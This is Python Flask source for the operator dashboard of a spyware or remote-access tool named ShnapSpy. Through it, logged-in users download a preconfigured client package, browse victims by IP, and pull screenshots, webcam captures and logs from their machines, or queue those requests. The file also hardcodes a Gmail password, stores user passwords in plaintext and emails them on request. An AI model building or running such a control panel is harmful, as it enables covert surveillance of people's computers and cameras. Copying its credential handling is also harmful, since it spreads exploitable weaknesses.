from flask import Flask, redirect, url_for, render_template, Response, request, session, send_from_directory
from time import sleep
import hashlib
from flask_sqlalchemy import SQLAlchemy
import os
from thread_server import main
import json
import smtplib
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# from emailTest import generate_confirmation_token, confirm_token
app = Flask(__name__, static_url_path='/static')
app.secret_key = "hello"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.sqlite3'
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)
USERS_PATH = os.path.join(os.path.dirname(__file__), "..", "Users")
ZIP_PATH = os.path.join(os.path.dirname(__file__), "ZIP")
INSTALL_PATH = os.path.join(os.path.dirname(__file__), "INSTALL")
TEMPLATE_PATH = os.path.join(os.path.dirname(__file__), "CLIENT TEMPLATE")

GMAIL_PASSWORD = 'SpyShnap2307'
GMAIL_NAME = 'spyshnap@gmail.com'

# creates the folders that hold temporary files
if not os.path.relpath(ZIP_PATH):
    os.mkdir(ZIP_PATH)
if not os.path.relpath(INSTALL_PATH):
    os.mkdir(INSTALL_PATH)

# config template for client
CONFIG_TEMPLATE = {
    'key': "0" * 33,
    'related': None
}


# user table in database for users to log in flask
class Users(db.Model):
    _id = db.Column("id", db.Integer, primary_key=True)
    email = db.Column(db.String(100))
    password = db.Column(db.String(100))
    regular_password = db.Column(db.String(100))

    def __init__(self, email, password, regular_password):
        self.email = email
        self.password = password
        self.regular_password = regular_password


# main page/ home , contains clients directed to you
@app.route("/", methods=["POST", "GET"])
def home():
    """
    :permission to enter site: user is in session
    :GET: returns the home site with the client list connected to the client
    :POST: returns the home site with the client list connected to the client using the search request.
    """
    if "user" not in session:
        return redirect(url_for("login"))

    user = Users.query.filter_by(email=session['user']).first()

    clients = server.get_clients(user._id)  # returns [nick,ip,If online, id]
    organized_clients = []

    if request.method == "POST":

        ip = request.form["search"]

        if ip is None:
            return render_template("home.html")
        else:
            for nick, client_ip, online, identification in clients:
                print(ip.startswith(ip))
                if (nick and nick.startswith(ip)) or client_ip.startswith(ip):
                    organized_clients.append([nick if nick else client_ip, online, identification])

            return render_template("home.html", addresses=organized_clients)
    else:

        for nick, ip, online, identification in clients:
            organized_clients.append([nick if nick else ip, online, identification])
        return render_template("home.html", addresses=organized_clients)


@app.route('/recover', methods=['POST', 'GET'])
def recover_password():
    """
    :GET: returns the recover site
    :POST:
    if email in database : sends an email containing the password to the specified email
    else : sends error message

    """
    if request.method == "POST":
        print("entered here")
        email = request.form['email']
        print(email)
        user = Users.query.filter_by(email=email).first()
        if user:
            outcome = send_email(email, 1, user.regular_password)
            if outcome:
                return render_template('recover.html',
                                       success=f"We sent your password to {email}. Please check both your inbox and spam folder.")
            else:
                return render_template('recover.html',
                                       error=f"Something went wrong, please try again later.")

        else:
            return render_template('recover.html', error="Email does not exist.")
    return render_template('recover.html')


@app.route("/settings", methods=["POST", "GET"])
def settings():
    """
    :permission to enter site: user is in session
    :GET: returns the settings site
    :POST: changes the inputs you wanted to change accordingly if inputted the right password.

    """
    if "user" not in session:
        return redirect(url_for("login"))

    found_user = Users.query.filter_by(email=session["user"]).first()
    if request.method == "POST":
        email, password, realPassword, password2 = request.form["newEmail"], request.form["newPass"], request.form[
            "currentPass"], request.form["retypePass"]
        realPassword_encryption = hashlib.sha256(realPassword.encode())

        if found_user.password != realPassword_encryption.hexdigest() or realPassword == "":  # password not true or password is missing

            return render_template("settings.html", email=found_user.email, password_error=True)


        if email != "":
            the_new_emailUser = Users.query.filter_by(email=email).first()
            if the_new_emailUser:
                return render_template("settings.html", email=found_user.email, email_error=True)
            found_user.email = email
            session["user"] = email

        if password != "" and password == password2 and len(password) >= 8:
            pass_encode = hashlib.sha256(password.encode())
            found_user.password = pass_encode.hexdigest()
            found_user.regular_password = password

        db.session.commit()

        return render_template("settings.html", email=found_user.email, saved=True)

    else:
        return render_template("settings.html", email=found_user.email)


@app.route("/login", methods=["POST", "GET"])
def login():
    """
    :GET: returns the login site if user isnt already connected to the session.
    :POST: checks if the inputs are correct and are in the database and connects him.

    """
    if 'user' in session:
        return back_home()
    if request.method == "POST":
        print("yes")
        email, password = request.form["email"], request.form["password"]
        if len(email) == 0 and len(password) == 0:
            return render_template("login.html", error_name=1, name_error_reason="Email field is missing", error_pass=1,
                                   pass_error_reason="Password field is missing")
        elif len(email) == 0:
            return render_template("login.html", error_name=1, name_error_reason="Email field is missing")
        elif len(password) == 0:
            return render_template("login.html", error_pass=1, pass_error_reason="Password field is missing")
        found_user = Users.query.filter_by(email=email).first()
        if found_user and found_user.email == email and found_user.password == hashlib.sha256(
                password.encode()).hexdigest():
            session["user"] = found_user.email
        else:
            return render_template("login.html", error_name=1, name_error_reason="Email or Password are invalid",
                                   error_pass=1,
                                   pass_error_reason="Email or Password are invalid")

        print("HERE")
        return redirect(url_for("home"))
    else:
        if "user" in session:
            return redirect(url_for("home"))
        return render_template("login.html", error_name=0)


@app.route("/signUp", methods=["POST", "GET"])
def signUp():
    """
    :GET: returns the signup site.
    :POST: checks if email isn't an already used one and makes a new user in the database.

    """
    email = None
    if request.method == "POST":
        email, password = request.form["email"], request.form["password"]
        if len(email) == 0 and len(password) == 0:
            return render_template("signUp.html", error_name=1, name_error_reason="Email field is missing",
                                   error_pass=1,
                                   pass_error_reason="Password field is missing")
        elif len(email) == 0:
            return render_template("signUp.html", error_name=1, name_error_reason="Email field is missing")
        elif len(password) == 0:
            return render_template("signUp.html", error_pass=1, pass_error_reason="Password field is missing")
        found_user = Users.query.filter_by(email=email).first()
        if found_user:
            return render_template("signUp.html", error_name=1, name_error_reason="This email address is not available")

        else:
            encrypted_pass = hashlib.sha256(password.encode())
            hex_pass = encrypted_pass.hexdigest()
            usr = Users(email, hex_pass, password)
            db.session.add(usr)
            db.session.commit()
            # session["user"] = email
            print("got here?")

        return back_home()
    else:
        return render_template("signUp.html", error_name=0)


@app.route('/clients/<string:client>', methods=["POST", "GET"])
def client(client, error=False):
    """
    :param client: [client.ip,client.id]
    :param error: Boolean if process had a problem

    :permission to enter site: user is in session and has relation to the client.

    :GET: returns the specified client and all of it's contents
    :POST: changes the nickname of client

    """
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        return back_home()

    print(request.base_url)
    print(client)
    ip, id = client.split(',')
    print(ip)
    print(id)
    client = server.get_client(int(id))
    image_path = os.path.join(client.path, "images")
    webcam_path = os.path.join(client.path, "webcam")
    log_path = os.path.join(client.path, "logs.txt")
    image_list = []
    webcam_list = []

    if request.method == "POST":
        nick = request.form['newNick']
        client.nick = nick if nick != "" else None
        db.session.commit()

    with open(log_path, "r") as log_reader:
        logs = log_reader.readlines()
    if os.path.isdir(image_path):
        for img in os.listdir(image_path):
            image_list.append([img, img[:-4].replace("_", ":").replace("-", "/")])
    else:
        os.mkdir(image_path)

    if os.path.isdir(webcam_path):
        for img in os.listdir(webcam_path):
            print(img)
            webcam_list.append([img, img[:-4].replace("_", ":").replace("-", "/")])
    else:
        os.mkdir(webcam_path)

    return render_template("ip_options.html",
                           nick=client.nick,
                           ip=client.ip,
                           id=id,
                           logs=logs,
                           image_list=image_list,
                           webcam_list=webcam_list,
                           online=server.isOnline(int(id)),
                           error=request.args.get('error') == 'True' if "error" in request.args.keys() else False,
                           success=request.args.get('success') == 'True' if "success" in request.args.keys() else False)


@app.route('/clients/<string:client>/<string:image>/<string:type>')
def show_image(client, image, type):
    """

    :param client: [client.ip,client.id]
    :param image: the name of the image
    :param type: the type of image - [image,webcam]

    :permission to enter site: user is in session and has relation to the client.

    :return: the show_image site
    """
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        return back_home()

    ip, id = client.split(',')
    print(client)
    print(image)
    print(type)

    return render_template('image_show.html',
                           ip=ip,
                           id=id,
                           image_name=image,
                           image_represent = image.replace("_", ":").replace("-", "/")[0:len(image)-4],
                           type=type)


@app.route('/uploads/<string:client>/<string:filename>/<string:type>')
def download_file(client, filename, type):
    """

    :param client: [client.ip,client.id]
    :param filename: the name of the file you want to download
    :param type: type of file you want to download (image,webcam,log)

    :permission to enter site: user is in session and has relation to the client.

    :return: the file the user wanted to download

    """
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        print("home???????")
        return back_home()

    image_path = server.get_client(client.split(",")[1]).path
    print("FILE NAME:", filename)
    if type == "image":
        image_path = os.path.join(image_path, "images")
    elif type == "webcam":
        image_path = os.path.join(image_path, "webcam")

    return send_from_directory(image_path, filename, as_attachment=True)


@app.route('/install')
def install():
    """
    :permission to enter site: user in session
    :return: Client zip template containing the config.JSON that contains the relation of user.
    """
    if 'user' not in session:
        return back_home()
    zip_name = session['user'] + ' Client.zip'
    folder = os.path.join(INSTALL_PATH, session['user'] + ' Client')

    destination = shutil.copytree(TEMPLATE_PATH, folder)
    config_path = os.path.join(destination, 'ShnapSpy Client', 'data.json')
    specific_config = CONFIG_TEMPLATE.copy()
    user = Users.query.filter_by(email=session['user']).first()
    specific_config['related'] = str(user._id)
    with open(config_path, 'w') as dumper:
        json.dump(specific_config, dumper)
    zip_file = shutil.make_archive(destination, 'zip', destination)
    print(zip_file)
    with open(zip_file, 'rb') as f:
        data = f.readlines()
    os.remove(zip_file)
    shutil.rmtree(folder, ignore_errors=True)
    return Response(data, headers={
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename=%s;' % zip_name
    })


@app.route("/download zip/<path:client>")
def download_zip(client):
    """

    :param client: [client.ip,client.id]
    :argument: image containing all of the images or webcam contains all of the webcam images
    :permission to enter site: user is in session and has relation to the client.

    :return: Zip contains selected content from client site
    """
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        return back_home()
    print(request.args.get('images'))
    encrypted_user = hashlib.sha256(session['user'].encode())
    zip_name = encrypted_user.hexdigest() + ".zip"
    if "images" in request.args.keys():
        print("in")
        images = request.args.get('images')
        image_path = os.path.join(server.get_client(client.split(",")[1]).path, "images")

    else:
        images = request.args.get('webcams')
        image_path = os.path.join(server.get_client(client.split(",")[1]).path, "webcam")
    images = images.strip('][').replace('"', "").split(',')

    if not os.path.isdir(ZIP_PATH):
        os.mkdir(ZIP_PATH)
    images_zip = os.path.join(ZIP_PATH, encrypted_user.hexdigest())
    os.mkdir(images_zip)

    for image in images:
        temp_path = os.path.join(image_path, image)
        temp_copy = os.path.join(images_zip, image)
        shutil.copyfile(temp_path, temp_copy)

    shutil.make_archive(images_zip, 'zip', images_zip)
    with open(images_zip + ".zip", 'rb') as f:
        data = f.readlines()
    os.remove(os.path.join(ZIP_PATH, zip_name))
    shutil.rmtree(images_zip,ignore_errors=True)
    return Response(data, headers={
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename=%s;' % zip_name
    })


@app.route("/delete/<path:client>")
def delete_client_content(client):
    """
    :permission to enter site: user in session and has relation to client
    :param client: [client.ip,client.id]
    :return: deletes requested content from client folder
    """
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        return back_home()

    if "images" in request.args.keys():
        images = request.args["images"].strip('][').replace('"', "").split(',')
        images_path = os.path.join(server.get_client(client.split(",")[1]).path, "images")
        for image in images:
            print(os.path.join(images_path, image))
            path = os.path.join(images_path, image)
            if os.path.isfile(path):
                os.remove(path)

    elif "webcams" in request.args.keys():
        images = request.args["webcams"].strip('][').replace('"', "").split(',')
        images_path = os.path.join(server.get_client(client.split(",")[1]).path, "webcam")
        for image in images:
            print(os.path.join(images_path, image))
            path = os.path.join(images_path, image)
            if os.path.isfile(path):
                os.remove(path)

    elif "logs" in request.args.keys():
        logs_path = os.path.join(server.get_client(client.split(",")[1]).path, "logs.txt")
        open(logs_path, 'w').close()

    # elif "logs" in request.args.keys():
    return redirect(url_for("client", client=client))




@app.route("/logout")
def logout():
    """

    :return: Logs out the user from session
    """
    if "user" in session:
        session.pop("user", None)
    return redirect(url_for("login"))


@app.errorhandler(404)
def page_not_found(e):
    return back_home()


@app.route("/retrieve/<path:client>/<string:action>")
def retrieve(client, action):
    """
    makes action on specified client


    :permission to enter: user in session and has relation to client
    :param client: [client.ip, client.id]
    :param action: type of action to do on client [img,web,log,end]
    :return: client site with the outcome of the request.
    """
    print("start retrieve on :", action)
    print(type(action))
    if 'user' not in session or not client_related(Users.query.filter_by(email=session['user']).first()._id,
                                                   client.split(",")[1]):
        return back_home()
    ip, identification = client.split(",")

    user = Users.query.filter_by(email=session['user']).first()

    if server.isOnline(int(identification)):
        # the user is online
        print("inside he is online ")
        outcome = server.fetch_data(int(identification), action)
        if action == "end":
            # the client gets deleted from the database so it needs a redirect home instead
            return back_home()
        return redirect(url_for("client", client=client, error=not outcome, success=outcome))
    else:
        # the user isn't online
        print("inside he is  NOT online ")
        outcome = server.add_request(int(identification), action)
        print("THE OUTCOME IS ", outcome)
        return redirect(url_for("client", client=client, success=outcome, error=not outcome))


def client_related(user_id, identification):
    """
    checks if user is related to client

    :param user_id: Users._id
    :param identification: client.id
    :return: True or False whether the user is related to client.
    """
    return server.get_client(identification).relation == user_id


def send_email(recipient, subject, content):
    """

    :param recipient:  The email of the user that gets the email
    :param subject:  what type of email this is
    :param content: specific content per subject
    :return: True or False whether function worked
    """
    # subject :
    # 1 = missing password

    me = GMAIL_NAME
    you = recipient

    msg = MIMEMultipart('alternative')

    msg['From'] = me
    msg['To'] = you

    if subject == 1:
        print("reached here")
        msg['Subject'] = "Recover Password"
        subject = f"Your ShnapSpy password is  <b>{content}<b>"
        underText = "If you did not request to recover your password, please ignore this email."

    # Create the body of the message (a plain-text and an HTML version).


    html = f"""\
    <!DOCTYPE html>
    <html lang="en">
    <head>
    </head>
    <body>

    <div>
        <div style="background-color:#f9f9f9">

            <div style="margin:0px auto;max-width:640px;background:transparent">
                <table role="presentation" cellpadding="0" cellspacing="0"
                       style="font-size:0px;width:100%;background:transparent" align="center" border="0">
                    <tbody>
                    <tr>
                        <td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:40px 0px">
                            <div aria-labelledby="mj-column-per-100" class="m_-6063607966002984259mj-column-per-100"
                                 style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%">
                                <table role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
                                    <tbody>
                                    <tr>
                                        <td style="word-break:break-word;font-size:0px;padding:0px" align="center">
                                            <table role="presentation" cellpadding="0" cellspacing="0"
                                                   style="border-collapse:collapse;border-spacing:0px" align="center"
                                                   border="0">
                                                <tbody>
                                                <tr>
                                                    <td style="width:138px"><a>Shnap</a></td>
                                                </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>
                                    </tbody>
                                </table>
                            </div>
                        </td>
                    </tr>
                    </tbody>
                </table>
            </div>
            <div style="max-width:640px;margin:0 auto;border-radius:4px;overflow:hidden">
                <div style="margin:0px auto;max-width:640px;background:#ffffff">
                    <table role="presentation" cellpadding="0" cellspacing="0"
                           style="font-size:0px;width:100%;background:#ffffff" align="center" border="0">
                        <tbody>
                        <tr>
                            <td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:40px 50px">
                                <div aria-labelledby="mj-column-per-100" class="m_-6063607966002984259mj-column-per-100"
                                     style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%">
                                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
                                        <tbody>
                                        <tr>
                                            <td style="word-break:break-word;font-size:0px;padding:0px" align="left">
                                                <div style="color:#737f8d;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:16px;line-height:24px;text-align:left">

                                                    <h2 style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-weight:500;font-size:20px;color:#4f545c;letter-spacing:0.27px">
                                                        Hey {you},</h2>
                                                    <p>{subject}.</p>

                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td style="word-break:break-word;font-size:0px;padding:30px 0px"><p
                                                    style="font-size:1px;margin:0px auto;border-top:1px solid #dcddde;width:100%"></p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td style="word-break:break-word;font-size:0px;padding:0px" align="left">
                                                <div style="color:#747f8d;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:13px;line-height:16px;text-align:left">
                                                    <p>{underText}</p>
                                                </div>
                                            </td>
                                        </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </div>
            <div style="margin:0px auto;max-width:640px;background:transparent">
                <table role="presentation" cellpadding="0" cellspacing="0"
                       style="font-size:0px;width:100%;background:transparent" align="center" border="0">
                    <tbody>
                    <tr>
                        <td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:20px 0px">
                            <div aria-labelledby="mj-column-per-100" class="m_-6063607966002984259mj-column-per-100"
                                 style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%">
                                <table role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0">
                                    <tbody>
                                    <tr>
                                        <td style="word-break:break-word;font-size:0px;padding:0px" align="center">
                                            <div style="color:#99aab5;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:12px;line-height:24px;text-align:center">
                                                Sent by SpyShnap •
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="word-break:break-word;font-size:0px;padding:0px" align="center">
                                            <div style="color:#99aab5;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:12px;line-height:24px;text-align:center">
                                                20 Borochov Givataym, Israel
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="word-break:break-word;font-size:0px;padding:0px" align="left">
                                            <div style="color:#000000;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:13px;line-height:22px;text-align:left">
                                                <img src="https://ci3.googleusercontent.com/proxy/rBiOol8vnDFpahLgsxgZjn9W4UWbP_WUT1x8swXiFBsjjmizsfoVAUQT81syA5y9Gu8ZfaAJYcjdHjvFeIl_DuuVai17URgwiW2BNCL-kti1MHbbY_H2Gq7jOlaxMVr9L0xzZjOFMioY4a8_Nxz8ezbo_g_FpzTYdBoyW2Fm-5vJIghiZZKYpfMynw-5WgLTmouaGo1LhCj3-cCxvIkwDGAwuVqMf0lrr8o4GdprGCCYA8ZY-_ST=s0-d-e1-ft#https://discord.com/api/science/281060902063833088/9982c8c6-9ecc-4585-9d0e-a961df6dba71.gif?properties=eyJlbWFpbF90eXBlIjogInVzZXJfcGFzc3dvcmRfcmVzZXRfcmVxdWVzdCJ9"
                                                     width="1" height="1" class="CToWUd">
                                            </div>
                                        </td>
                                    </tr>
                                    </tbody>
                                </table>
                            </div>
                        </td>
                    </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    </body>
    </html>
    """

    # Record the MIME types of both parts - text/plain and text/html.

    part2 = MIMEText(html, 'html')

    # Attach parts into message container.
    # According to RFC 2046, the last part of a multipart message, in this case
    # the HTML message, is best and preferred.

    msg.attach(part2)

    # Send the message via local SMTP server.
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()
        s.starttls()
        s.login(GMAIL_NAME, GMAIL_PASSWORD)

        # sendmail function takes 3 arguments: sender's address, recipient's address
        # and message to send - here it is sent as one string.
        s.sendmail(me, you, msg.as_string())
        s.quit()
        return True
    except Exception as e:
        print(e)
        return False


def back_home():
    """
    bring user back to home site
    :return: home site
    """
    return redirect(url_for("home"))


if __name__ == '__main__':
    db.create_all()
    server = main(db)
    app.run(host='0.0.0.0', port='5000')
